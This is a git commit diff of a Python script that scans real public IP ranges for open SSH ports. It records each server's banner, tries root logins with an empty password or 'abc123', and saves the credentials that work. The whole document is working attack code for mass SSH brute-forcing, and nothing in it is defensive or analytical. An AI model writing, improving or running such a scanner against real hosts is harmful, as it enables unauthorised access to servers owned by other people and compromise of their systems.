8ed1c0f0804c5a99fb6415cef4e08febb5655215
itoutsourcing86 <itoutsourcing86@gmail.com>
2018-02-08 01:42:17 +0500

    Test version

--- bot.py
+++ bot.py
@@ -12,6 +12,11 @@ def save_data(data):
         f.write(data)
 
 
+def save_banners(data):
+    with open("banners.txt", "a")as b:
+        b.write(data)
+
+
 # Generating ip list from ip range
 def generate_hosts(start_ip, end_ip):
     start = list(map(int, start_ip.split(".")))
@@ -45,23 +50,32 @@ class Worker(threading.Thread):
             self.check(ip)
             self.queue.task_done()
 
+    # Checking open port 22
     def check(self, ip):
         try:
             cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            cli.settimeout(5)
+            cli.settimeout(10)
             cli.connect((ip, 22))
             banner = cli.recv(1024)
+
+            if banner.decode("utf-8").find("refused") == -1:
+                save_banners("%s\t%s\n"% (ip, banner))
+
             print("[INFO] %s\t%s"% (ip, banner))
-            self.login(ip)
+            self.login(ip, banner)
         except Exception as e:
             print("[ERROR] %s\t%s"% (ip, e))
 
-    def login(self, ip):
+    # If port 22 opened, try to connect
+    def login(self, ip, banner):
         try:
             ssh_client = paramiko.SSHClient()
             ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh_client.connect(ip, port=22, username=self.username, password=self.password, timeout=15)
-            save_data("%s:%s:%s\n"% (ip, self.username, self.password))
+            ssh_client.connect(ip, port=22, username=self.username,
+                               password=self.password,
+                               timeout=20,
+                               banner_timeout=5)
+            save_data("%s:%s:%s\t%s\n"% (ip, self.username, self.password, banner))
             ssh_client.close()
         except Exception:
             print("[ERROR] Login failed %s"% ip)
@@ -70,12 +84,12 @@ class Worker(threading.Thread):
 def main():
     queue = Queue()
 
-    for i in range(254):
-        bot = Worker(queue, "root", "")
+    for i in range(260):
+        bot = Worker(queue, "root", "abc123")
         bot.setDaemon(True)
         bot.start()
 
-    ip_range = generate_hosts("58.8.0.0", "58.11.255.255")
+    ip_range = generate_hosts("202.44.0.1", "202.44.55.254")
 
     for ip in ip_range:
         queue.put(ip)
